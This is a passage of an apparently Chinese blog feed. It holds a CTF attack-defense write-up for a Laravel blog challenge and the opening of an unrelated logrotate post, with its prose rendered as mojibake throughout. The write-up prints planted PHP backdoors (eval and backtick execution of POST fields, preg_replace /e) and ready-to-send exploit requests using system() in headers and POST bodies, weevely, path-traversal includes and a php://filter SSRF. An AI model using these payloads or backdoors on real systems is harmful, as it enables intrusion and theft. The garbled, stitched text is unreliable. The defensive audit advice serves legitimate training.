<p><span class="md-line md-end-block">‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´Â§ö‰∏∫ÊúçÂä°Á´ØÁ®ãÂ∫èÂú®ÂºÄÂèëÊó∂Ê≤°ÂØπÂèØÂåÖÂê´ÁõÆÂΩïÂíåÊñá‰ª∂ÂÅöÈôêÂà∂ÔºåÂØºËá¥ÂèØ‰ª•ËØªÂèñ‰ªª‰ΩïÊñá‰ª∂„ÄÇ‰∏ÄËà¨ÁöÑË°®Áé∞ÂΩ¢Âºè‰∏∫<span spellcheck="false"><code>http://localhost/page=index</code></span>ÊàñÁ±ª‰ººÊñπÂºè„ÄÇÊú¨È¢ò‰∏≠ÔºåÊàë‰ª¨Âú®ÂçöÂÆ¢ÊñáÁ´†‰∏≠ÂºïÂÖ•‰∫ÜÊ≠£ÊñáÊ®°ÊùøÔºåËøôÈáåÁöÑÊ®°ÊùøÂ∞±ÂÖ∑ÊúâÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/views/posts/show.blade.php
&lt;div class="article-body"&gt;
    {{ require __DIR__."/../../template/".$post-&gt;template }}
    {{ $post-&gt;body }}
&lt;/div&gt;</pre>
<h3 class="md-end-block md-heading">‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</h3>
<p><span class="md-line md-end-block">‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†Â§ö‰∏∫ÊúçÂä°Á´ØÁ®ãÂ∫èÂú®ÂºÄÂèëÊó∂ÔºåÊú™ÂØπÂèØ‰∏ä‰º†Êñá‰ª∂ÁöÑÊâ©Â±ïÂêçËøõË°åÈôêÂà∂ÔºåÂØºËá¥ÂèØ‰ª•‰∏ä‰º†ÊúçÂä°Âô®ËÑöÊú¨ÔºåÂπ∂ÈÄöËøáHTTPËÆøÈóÆÊâßË°å„ÄÇÊú¨È¢ò‰∏≠ÔºåÊàë‰ª¨Âú®ÂçöÂÆ¢ÊñáÁ´†ÂõæÁâá‰∏ä‰º†Â§ÑÊú™ÂØπÂèØ‰∏ä‰º†Êñá‰ª∂ÂÅöÈôêÂà∂„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function uploadImage()
    {
        $data = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        if ($file = Input::file('upload_file'))
        {
            $fileName        = $file-&gt;getClientOriginalName();
            $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            $file-&gt;move($destinationPath, $safeName);
            $data['file_path'] = $folderName .'/'. $safeName;
            $data['msg'] = "Succeeded!";
            $data['success'] = true;
        }
        return $data;
    }</pre>
<h3 class="md-end-block md-heading">ÊúçÂä°Á´ØËØ∑Ê±Ç‰º™ÈÄ†</h3>
<p><span class="md-line md-end-block">ÊúçÂä°Á´ØËØ∑Ê±Ç‰º™ÈÄ†ÊòØÊåáÂú®ÂºÄÂèëËøáÁ®ã‰∏≠ÔºåÊúâ‰∫õÁî®Êà∑Êèê‰∫§ÁöÑËµÑÊ∫êÔºàÂ¶ÇÂõæÁâáÔºåÊñáÂ≠óÁ≠âÔºâÈúÄË¶ÅÂä†ËΩΩÂà∞ÊúçÂä°Âô®Êú¨Âú∞ËøõË°åÂ§ÑÁêÜÔºå‰ΩÜÊúçÂä°Á´ØÂπ∂Êú™ÂØπËµÑÊ∫êÂú∞ÂùÄËøõË°åÈôêÂà∂ÔºåÂØºËá¥ÁöÑÂèØ‰ª•Êé¢ÊµãÊúçÂä°Âô®ÂÜÖÁΩëÊàñ‰ªªÊÑèÊú¨Âú∞Êñá‰ª∂ËØªÂèñ„ÄÇÊú¨È¢ò‰∏≠ÔºåÊàë‰ª¨ËÆæËÆ°‰∫Ü/resolve_imageËøô‰∏™Ë∞ÉÁî®Ôºå‰ΩÜÊòØÂπ∂Ê≤°ÊúâÂà∂‰ΩúÁõ∏Â∫îÁöÑÂâçÁ´ØÈ°µÈù¢„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function resolveImage()
    {
        $resp = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        $data = Input::only('resolve_file');

        $content = @file_get_contents($data['resolve_file']);
        if ($content)
        {
            $extension       = 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            @mkdir($destinationPath, 0755, true);
            @file_put_contents($destinationPath .'/'. $safeName, $content);
            $resp['file_path'] = $folderName .'/'. $safeName;
            $resp['msg'] = "Succeeded!";
            $resp['success'] = true;
        }
        return $resp;
    }</pre>
<h2 class="md-end-block md-heading">0x01 ÂÆ°ËÆ°‰∏éÈò≤Âæ°ÊñπÂºè</h2>
<h3 class="md-end-block md-heading">Â∏∏ËßÅ‰∏ÄÂè•ËØùÊú®È©¨</h3>
<p><span class="md-line md-end-block">ÂèØ‰ª•ÈÄöËøágrepÊàñfindÁ≠âÂëΩ‰ª§ÊêúÁ¥¢Áõ∏ÂÖ≥ÂÖ≥ÈîÆÂ≠óÔºàÂ¶Ç<span spellcheck="false"><code>eval, system, passthru, $_POST, $_REQUEST</code></span>ÔºâÁ≠âÔºåÊù•Âø´ÈÄüÂÆö‰ΩçÁõ∏ÂÖ≥‰ΩçÁΩÆÔºåÈöèÂêéÂØπÊ∫êÁ†ÅËøõË°åÂÆ°Êü•„ÄÇËøôÁ±ªÊú®È©¨ÈÄöÂ∏∏‰∏ç‰ºöÂΩ±ÂìçÁ®ãÂ∫èËøêË°åÈÄªËæëÔºåÂõ†Ê≠§ÂèØ‰ª•Áõ¥Êé•Âà†Èô§Áõ∏ÂÖ≥‰ª£Á†Å„ÄÇ</span></p>
<pre class="lang:default decode:true">$ grep -re eval
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";

$grep -re \$_POST
bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);
bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();
bootstrap/compiled.php:        $request = array('g' =&gt; $_GET, 'p' =&gt; $_POST, 'c' =&gt; $_COOKIE);
bootstrap/autoload.php:echo `$_POST[checker]`;
public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))
...
app/views/errors/404.blade.php:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";</pre>
<h3 class="md-end-block md-heading">Â∏∏ËßÅÂ§ßÈ©¨</h3>
<p><span class="md-line md-end-block">Âü∫Êú¨ÊñπÊ≥ïÂêåÂ∞èÈ©¨Ôºå‰ΩÜÁî±‰∫éÂ§ßÈ©¨ÁªìÊûÑÂ§çÊùÇÔºåÊõ¥Âä†ÈúÄË¶ÅÂπ≥Êó∂ÁöÑÁßØÁ¥ØÂíå‰∫∫Â∑•ÂàÜÊûêËÉΩÂäõ„ÄÇËøôÁ±ªÊú®È©¨ÈÄöÂ∏∏‰∏ç‰ºöÂΩ±ÂìçÁ®ãÂ∫èËøêË°åÈÄªËæëÔºåÂõ†Ê≠§ÂèØ‰ª•Áõ¥Êé•Âà†Èô§Áõ∏ÂÖ≥‰ª£Á†ÅÊàñÊñá‰ª∂„ÄÇ</span></p>
<h3 class="md-end-block md-heading">‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´</h3>
<p><span class="md-line md-end-block">ÂèØ‰ª•ÈÄöËøágrepÊàñfindÁ≠âÂëΩ‰ª§ÊêúÁ¥¢Áõ∏ÂÖ≥ÂÖ≥ÈîÆÂ≠óÔºàÂ¶Ç<span spellcheck="false"><code>include, require</code></span>ÔºâÁ≠âÔºåÊù•Âø´ÈÄüÂÆö‰ΩçÁõ∏ÂÖ≥‰ΩçÁΩÆÔºåÈöèÂêéÂØπÊ∫êÁ†ÅËøõË°åÂÆ°Êü•„ÄÇ‰ΩÜÂõ†‰∏∫ËøôÁ±ªÂÖ≥ÈîÆËØçÂá†‰πéÂú®ÊâÄÊúâÁöÑ‰ª£Á†ÅÊñá‰ª∂‰∏≠ÈÉΩÂ≠òÂú®ÔºåÂÆ°Êü•ÈöæÂ∫¶Áõ∏ÂØπËæÉÂ§ß„ÄÇ‰ΩÜÁî±‰∫é‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´‰∏ÄËà¨Âá∫Áé∞Âú®‰∏öÂä°ÈÄªËæëÂÜÖÔºå‰∏éÂ∏∏Áî®Â∫ìÁöÑÂåÖÂê´ÊñπÂºèÊúâÊâÄÂå∫Âà´ÔºåÊúâËÉΩÂäõÁöÑÂõ¢ÈòüÂèØ‰ª•ÂºÄÂèë‰∏Ä‰∫õÂÆ°ËÆ°Â∑•ÂÖ∑ÔºåÂØπÂÖ∂ÁâπÂæÅËøõË°åÂÆ°ËÆ°Ôºå‰πüÂèØ‰ª•‰ªé‰∏öÂä°ÈÄªËæëÂÖ•ÊâãÂØπÁõ∏ÂÖ≥‰ª£Á†ÅËøõË°åÂÆ°ËÆ°„ÄÇÁî±‰∫éËøôÁ±ªÈóÆÈ¢ò‰ºöÂΩ±ÂìçÁ®ãÂ∫èËøêË°åÈÄªËæëÔºåÂõ†Ê≠§ÈúÄË¶ÅÈÄâÊâãÁêÜËß£È¢òÊÑèÔºåÊ†πÊçÆÈ¢òÁõÆÁöÑ‰∏öÂä°ÈÄªËæë‰øÆÂ§ç‰ª£Á†ÅÊàñÊ∑ªÂä†Èò≤Âæ°Êé™ÊñΩ„ÄÇ</span></p>
<p><span class="md-line md-end-block">Âú®Êú¨È¢ò‰∏≠ÔºåÂÆπÊòìÂèëÁé∞Á≥ªÁªüËá™Â∏¶ÁöÑ‰∏â‰∏™Ê®°ÊùøÂùá‰ª•<span spellcheck="false"><code>[0-9]\.tpl</code></span>ÂëΩÂêçÔºåÂõ†Ê≠§Âú®Áõ∏ÂÖ≥‰∏öÂä°ÈÄªËæë‰∏≠ÔºåÂØπÊèê‰∫§ÁöÑÊ®°ÊùøÂêçÁß∞ËøõË°åËøáÊª§Âç≥ÂèØ„ÄÇÂÖ∑‰ΩìÁöÑ‰ΩçÁΩÆÂ¶Ç‰∏ã„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function store()
{
    $validator = Validator::make(Input::all(), Post::$rules);
    
    if ($validator-&gt;fails())
    {
        return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    $data = Input::only('title', 'body', 'category_id', 'template');
    $data['user_id'] = Auth::user()-&gt;id;
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post = Post::create($data);
    $post-&gt;tag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}
# 2. app/controllers/PostsController.php
public function update($id)
{
    $post = Post::findOrFail($id);
    $this-&gt;authorOrAdminPermissioinRequire($post-&gt;user_id);
    $validator = Validator::make($data = Input::all(), Post::$rules);
    if ($validator-&gt;fails())
    {
            return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post-&gt;update($data);
    $post-&gt;retag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}</pre>
<p><span class="md-line md-end-block">Âú®Ëøô‰∏§‰∏™ÂáΩÊï∞‰∏≠ÔºåÂØπ<span spellcheck="false"><code>$data['template']</code></span>Êèê‰æõÁöÑÊñá‰ª∂ÂêçËøõË°åÊ≠£ÂàôÂåπÈÖçËøáÊª§Âç≥ÂèØ„ÄÇ</span></p>
<h3 class="md-end-block md-heading">‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†</h3>
<p><span class="md-line md-end-block">ÂèØ‰ª•ÈÄöËøágrepÊàñfindÁ≠âÂëΩ‰ª§ÊêúÁ¥¢Áõ∏ÂÖ≥ÂÖ≥ÈîÆÂ≠óÔºàÂ¶Ç<span spellcheck="false"><code>upload, $_FILES, move_uploaded_file, move</code></span>ÔºâÁ≠âÔºåÊù•Âø´ÈÄüÂÆö‰ΩçÁõ∏ÂÖ≥‰ΩçÁΩÆÔºåÈöèÂêéÂØπÊ∫êÁ†ÅËøõË°åÂÆ°Êü•„ÄÇËøôÁ±ªÊºèÊ¥û‰∏ÄËà¨ÊØîËæÉÂÆπÊòìËøõË°åÂÆ°Êü•ÔºåÁõ∏ÂÖ≥ÂÖ≥ÈîÆËØçÂç≥ÂèØÂ§ßËá¥ÂÆö‰ΩçÂèØËÉΩÂá∫Áé∞ÈóÆÈ¢òÁöÑ‰ΩçÁΩÆ„ÄÇÁî±‰∫éËøôÁ±ªÂáΩÊï∞Áî®ÈÄîÂæàÂ§öÔºåÂõ†Ê≠§ÂÆ°ËÆ°ÈöæÂ∫¶‰πüÁõ∏ÂØπËæÉÂ§ß„ÄÇÂª∫ËÆÆ‰ªé‰∏öÂä°ÈÄªËæëÂÖ•ÊâãÂØπÁõ∏ÂÖ≥‰ª£Á†ÅËøõË°åÂÆ°ËÆ°„ÄÇÁî±‰∫éËøôÁ±ªÈóÆÈ¢ò‰ºöÂΩ±ÂìçÁ®ãÂ∫èËøêË°åÈÄªËæëÔºåÂõ†Ê≠§ÈúÄË¶ÅÈÄâÊâãÁêÜËß£È¢òÊÑèÔºåÊ†πÊçÆÈ¢òÁõÆÁöÑ‰∏öÂä°ÈÄªËæë‰øÆÂ§ç‰ª£Á†ÅÊàñÊ∑ªÂä†Èò≤Âæ°Êé™ÊñΩ„ÄÇ</span></p>
<p><span class="md-line md-end-block">Âú®Êú¨È¢ò‰∏≠ÔºåÂÆπÊòìÂèëÁé∞ÂçöÂÆ¢ÊñáÁ´†ÂõæÁâá‰∏ä‰º†ÂäüËÉΩÊú™ÂØπÊñá‰ª∂Á±ªÂûãËøõË°åËøáÊª§ÔºåÊàë‰ª¨ÈúÄË¶Å‰øÆÊîπÁõ∏ÂÖ≥‰ª£Á†ÅÔºåËøáÊª§ÊéâÂèØËÉΩÂØºËá¥‰∏ä‰º†Êú®È©¨Êñá‰ª∂ÁöÑÊâ©Â±ïÂêç„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function uploadImage()
{
    $data = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    if ($file = Input::file('upload_file'))
    {
        $fileName        = $file-&gt;getClientOriginalName();
        $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        $file-&gt;move($destinationPath, $safeName);
        $data['file_path'] = $folderName .'/'. $safeName;
        $data['msg'] = "Succeeded!";
        $data['success'] = true;
    }
    return $data;
}</pre>
<p><span class="md-line md-end-block">ËøôÈáåÂèØ‰ª•ÁÆÄÂçïÁöÑËøáÊª§<span spellcheck="false"><code>$safeName</code></span>‰∏≠ÊòØÂê¶ÂåÖÂê´<span spellcheck="false"><code>'php'</code></span>Á≠âÂèØ‰Ωú‰∏∫ËÑöÊú¨ËøêË°åÁöÑÊñá‰ª∂Êâ©Â±ïÂêçÂ≠óÁ¨¶‰∏≤ÔºåÂèëÁé∞ÈóÆÈ¢òÁõ¥Êé•ËøîÂõûÈîôËØØÂç≥ÂèØ„ÄÇ</span></p>
<h3 class="md-end-block md-heading">ÊúçÂä°Á´ØËØ∑Ê±Ç‰º™ÈÄ†</h3>
<p><span class="md-line md-end-block">ÂèØ‰ª•ÈÄöËøágrepÊàñfindÁ≠âÂëΩ‰ª§ÊêúÁ¥¢Áõ∏ÂÖ≥ÂÖ≥ÈîÆÂ≠óÔºàÂ¶Çfile_get_content, curlÔºâÁ≠âÔºåÊù•Âø´ÈÄüÂÆö‰ΩçÁõ∏ÂÖ≥‰ΩçÁΩÆÔºåÈöèÂêéÂØπÊ∫êÁ†ÅËøõË°åÂÆ°Êü•„ÄÇ‰ΩÜÁî±‰∫éËøôÁ±ªÂáΩÊï∞Áî®ÈÄîÂæàÂ§öÔºåÂõ†Ê≠§ÂÆ°ËÆ°ÈöæÂ∫¶‰πüÁõ∏ÂØπËæÉÂ§ß„ÄÇÂª∫ËÆÆ‰ªé‰∏öÂä°ÈÄªËæëÂÖ•ÊâãÂØπÁõ∏ÂÖ≥‰ª£Á†ÅËøõË°åÂÆ°ËÆ°„ÄÇÁî±‰∫éËøôÁ±ªÈóÆÈ¢ò‰ºöÂΩ±ÂìçÁ®ãÂ∫èËøêË°åÈÄªËæëÔºåÂõ†Ê≠§ÈúÄË¶ÅÈÄâÊâãÁêÜËß£È¢òÊÑèÔºåÊ†πÊçÆÈ¢òÁõÆÁöÑ‰∏öÂä°ÈÄªËæë‰øÆÂ§ç‰ª£Á†ÅÊàñÊ∑ªÂä†Èò≤Âæ°Êé™ÊñΩ„ÄÇ</span></p>
<p><span class="md-line md-end-block">Âú®Êú¨È¢ò‰∏≠ÔºåÊ≠§ÊºèÊ¥ûÂπ∂‰∏çÂ≠òÂú®ÂâçÁ´ØË∞ÉÁî®ÔºåÂõ†Ê≠§Âè™ËÉΩÂØπ‰ª£Á†ÅËøõË°åÂÆ°ËÆ°„ÄÇÂèØ‰ª•ÂèëÁé∞Âú®<span spellcheck="false"><code>/resolve_file</code></span>ËØ∑Ê±ÇÂØπÂ∫îÁöÑÂ§ÑÁêÜÂáΩÊï∞‰∏≠Â≠òÂú®Ê≠§Á±ªÊÉÖÂÜµ„ÄÇ</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function resolveImage()
{
    $resp = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    $data = Input::only('resolve_file');

    $content = @file_get_contents($data['resolve_file']);
    if ($content)
    {
        $extension       = 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        @mkdir($destinationPath, 0755, true);
        @file_put_contents($destinationPath .'/'. $safeName, $content);
        $resp['file_path'] = $folderName .'/'. $safeName;
        $resp['msg'] = "Succeeded!";
        $resp['success'] = true;
    }
    return $resp;
}</pre>
<p><span class="md-line md-end-block">ÂèØ‰ª•ÂèëÁé∞ËøôÈáå<span spellcheck="false"><code>file_get_contents</code></span>Áõ¥Êé•‰º†ÂÖ•‰∫ÜËØ∑Ê±ÇÂèÇÊï∞ÔºåËÄåÊú™ÂØπÂÖ∂ÂÅöËøáÊª§ÔºåÂõ†Ê≠§ÂèØËÉΩÂØºËá¥‰ªªÊÑèÊñá‰ª∂ËØªÂèñ„ÄÇËøôÈáåÂèØ‰ª•ÈÄöËøáÊ£ÄÊü•<span spellcheck="false"><code>$data['resolve_file']</code></span>ÁöÑÂºÄÂ§¥ÊòØÂê¶‰∏∫<span spellcheck="false"><code>'http'</code></span>Âπ∂‰∏îÂØπ<span spellcheck="false"><code>'localhost'</code></span>, <span spellcheck="false"><code>'127.*.*.*'</code></span>Á≠âÁõ∏ÂÖ≥ÁöÑÂÜÖÁΩëÂüüÂêç„ÄÅIPÁ≠âËøõË°åËøáÊª§„ÄÇ</span></p>
<h2 class="md-end-block md-heading">0x02 ÊºèÊ¥ûÂà©Áî®ÊñπÂºè</h2>
<h3 class="md-end-block md-heading">1. index</h3>
<pre class="lang:default decode:true">GET http://localhost:21000/?method=assert HTTP/1.1
Host: localhost:21000
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Referer: system('cat /home/web/flag/flag')</pre>
<h3 class="md-end-block md-heading">2. 404</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/asdadasdaasd HTTP/1.1
Host: localhost:21000
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

notfound=system("cat%20%2Fhome%2Fweb%2Fflag%2Fflag")</pre>
<p><span class="md-line md-end-block">Âú®ÊØîËµõÁé∞Âú∫Áî±‰∫éÈÉ®ÁΩ≤Êó∂‰ΩøÁî®‰∫Üphp7, preg_matchÁöÑrÈÄâÈ°πÂ∑≤Êó†Ê≥ï‰ΩøÁî®ÔºåÂõ†Ê≠§ËØ•ÊºèÊ¥ûÂ§±Êïà„ÄÇ</span></p>
<h3 class="md-end-block md-heading">3. upload_image</h3>
<pre class="lang:default decode:true">POST /upload_image</pre>
<p><span class="md-line md-end-block">Áõ¥Êé•‰∏ä‰º†‰∏ÄÂè•ËØùÊú®È©¨ÔºåÈöèÂêéÈÄöËøá‰∏ÄÂè•ËØùÊú®È©¨Âà©Áî®„ÄÇ</span></p>
<h3 class="md-end-block md-heading">4. weevely in autoload_real.php</h3>
<pre class="lang:default decode:true">$ weevely http://ip:port/any xman1234</pre>
<p><span class="md-line md-end-block">ÈöèÂêéÈÄöËøáweevelyÁõ¥Êé•ËØªflag</span></p>
<h3 class="md-end-block md-heading">5. Post checker=shellcmd in autoload.php</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/ HTTP/1.1
Host: localhost:21000
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

checker=cat%20%2Fhome%2Fweb%2Fflag%2Fflag</pre>
<h3 class="md-end-block md-heading">6. template any file require</h3>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>http://localhost:21000/posts/create</code></span>Âú®ÂèëÂ∏ÉÊñáÁ´†Êó∂‰øÆÊîπÊèê‰∫§ÁöÑÊ®°ÊùøÂÄº</span></p>
<pre class="lang:default decode:true">html
&lt;div class="form-group"&gt;
    &lt;select class="form-control" name="template"&gt;
    &lt;option value="/../../../../../../home/web/flag/flag"&gt;Template 1&lt;/option&gt;
    &lt;option value="2.tpl"&gt;Template 2&lt;/option&gt;
    &lt;option value="3.tpl"&gt;Template 3&lt;/option&gt;&lt;/select&gt;
&lt;/div&gt;</pre>
<p><span class="md-line md-end-block">ÈöèÂêéÊñ∞ÂèëÂ∏ÉÁöÑÊñáÁ´†‰∏≠Â∞±‰ºöÂåÖÂê´flagÁöÑÂÄº</span></p>
<h3 class="md-end-block md-heading">7. resolve_file SSRF</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/resolve_image HTTP/1.1
Host: localhost:21000
Content-Length: 112
Content-Type: application/x-www-form-urlencoded
Cookie: laravel_session=eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D

resolve_file=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D../../../../../../home/web/flag/flag</pre>
<p><span class="md-line md-end-block"><span class="">ÈöèÂêéÊ†πÊçÆËøîÂõûÁöÑjsonÊñá‰ª∂‰∏≠file_pathÁöÑÂÄº‰∏ãËΩΩÊñá‰ª∂Âêébase64Ëß£Á†ÅÂç≥‰∏∫flag</span></span></p>
<p>&nbsp;</p>
<h2>0x03 ÊÄªÁªì</h2>
<p>ËøôÊ¨°Âá∫È¢òÈöæÂ∫¶Â±û‰∫éËæÉ‰∏∫ÁÆÄÂçïÁöÑÔºåËÄÉÂØüÁöÑ‰πüÊòØÊúÄÂü∫Á°ÄÁöÑ‰∏Ä‰∫õÂ∏∏ËßÅwebÊ≥®ÂÖ•ÁÇπ„ÄÇ‰ΩÜÁî±‰∫éÊó∂Èó¥ÂÖ≥Á≥ªÂíåÊØîËµõÊÄßË¥®ÔºåÊ≤°ÊúâÂØπXSSÔºåCSRFÔºåSQLÊ≥®ÂÖ•Á≠âÁü•ËØÜÁÇπËøõË°åËÄÉÂØüÔºå‰∏îÊâÄÊúâÁöÑÊºèÊ¥ûÁÇπÂùá‰∏∫ÂèØÁõ¥Êé•Âà©Áî®ÔºåÊ≤°ÊúâÈúÄË¶Å‰∫åÊ¨°Âà©Áî®ÁöÑÊºèÊ¥û„ÄÇ‰ª•ÂêéÂèØËÉΩ‰ºöÂ∞ùËØïÂá∫‰∏Ä‰∫õÂíåÂØÜÁ†ÅÂ≠¶/misc/pwnÁõ∏ÁªìÂêàÁöÑwebÊîªÈò≤È¢ò„ÄÇÊúÄÂêé‰πüÊÅ≠ÂñúÂú®ËøôÊ¨°Â§è‰ª§Ëê•‰∏≠ÂèñÂæó‰ºòÂºÇÊàêÁª©ÁöÑÂêÑ‰ΩçÂ§ßÂ∏àÂÇÖÔºÅ</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/logrotate.html</id>
        <title><![CDATA[Logrotate Êó•ÂøóÊªöÂä® Ëß£ÂÜ≥Êó•ÂøóÂç†Áî®Á©∫Èó¥ËøáÂ§ß]]></title>
        <updated>2017-05-03T16:23:04+08:00</updated>
        <link href="https://www.noisyfox.io/logrotate.html"/>
        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>Ëµ∑Âõ†</h1>
<p>ÂâçÂá†Â§©ÂèëÁé∞Ëá™Â∑±ÁöÑÂçöÂÆ¢Ê≤°ÊúâÂäûÊ≥ïÁôªÂΩï‰∫ÜÔºåÊØèÊ¨°ËæìÂÆåÂØÜÁ†ÅÁôªÂΩïÂÆåÈÉΩ‰ºöÈáçÊñ∞Ë∑≥ÂõûÁôªÂΩïÁïåÈù¢„ÄÇ‰∏ÄÂºÄÂßãÊòØÊÄÄÁñëÁôªÂΩïÁöÑsessionÂá∫‰∫Ü‰ªÄ‰πàÈóÆÈ¢òÔºåÂõ†‰∏∫ÊµèËßàÂô®ÂºÄÈöêË∫´Ê®°ÂºèÂêéÂ∞±ËÉΩÁôªÂΩïËøõÂéª„ÄÇÁÑ∂ËÄåÂºÄÈöêË∫´Ê®°ÂºèËøõÂêéÂè∞ÁöÑÊó∂ÂÄôÂèà‰ºöÂá∫Áé∞403ÈîôËØØÔºå‰∫éÊòØÊâìÁÆóËøûËøõÊï∞ÊçÆÂ∫ìÊääsessionÂà†Èô§ÂÜçËØïËØï„ÄÇ</p>
<p>ÁÑ∂ËÄåÂΩìÊàëËØïÂõæËøûÊé•Êï∞ÊçÆÂ∫ìÊó∂Âç¥‰∏ÄÁõ¥ÊèêÁ§∫Â§±Ë¥•Ôºå‰∫éÊòØËØïÂõæÈáçÂêØÊï∞ÊçÆÂ∫ìÊúçÂä°Ôºå‰ΩÜÊòØÁ≥ªÁªüÊèêÁ§∫ÂêØÂä®Â§±Ë¥•„ÄÇÁîµËÑëÂùè‰∫ÜÊÄé‰πàÂäûÔºüÈáçÂêØÂ§ßÊ≥ïÔºÅÁÑ∂ËÄåÊï∞ÊçÆÂ∫ìÊúçÂä°‰æùÊóßÊó†Ê≥ïÂêØÂä®ÔºåÂΩìÊó∂Êàë‰πüÊòØÊë∏‰∏çÁùÄÂ§¥ËÑë„ÄÇÊòéÊòé‰ª•Ââç‰∏ÄÁõ¥Â•ΩÂ•ΩÁöÑÊúçÂä°Âô®ÊÄé‰πàËØ¥ÁÇ∏Â∞±ÁÇ∏Âë¢Ôºü</p>
<h1>ÁúüÁõ∏</h1>
<p>ÂêéÊù•ÊàëÊú∫Êô∫ÁöÑÁúã‰∫Ü‰∏ãÁ£ÅÁõòÁöÑÂç†Áî®ÊÉÖÂÜµÔºö</p>
<pre class="brush: bash; title: ; notranslate">df -hl</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
<p>ÁÑ∂ÂêéÊàëÂ∞±ÈúáÊÉä‰∫ÜÔºÅÔºÅ<span style="color: #000000;"><del>ÈúáÊÉäÔºÅËøáÊ∞îÂçö‰∏ªÁ°¨Áõò‰∏∫‰ΩïË¢´Ê¶®Âπ≤ÔºÅËøôËÉåÂêéÁ©∂Á´üÊòØ‰∫∫ÊÄßÁöÑ&#8230;ÔºàÂï™</del></span></p>
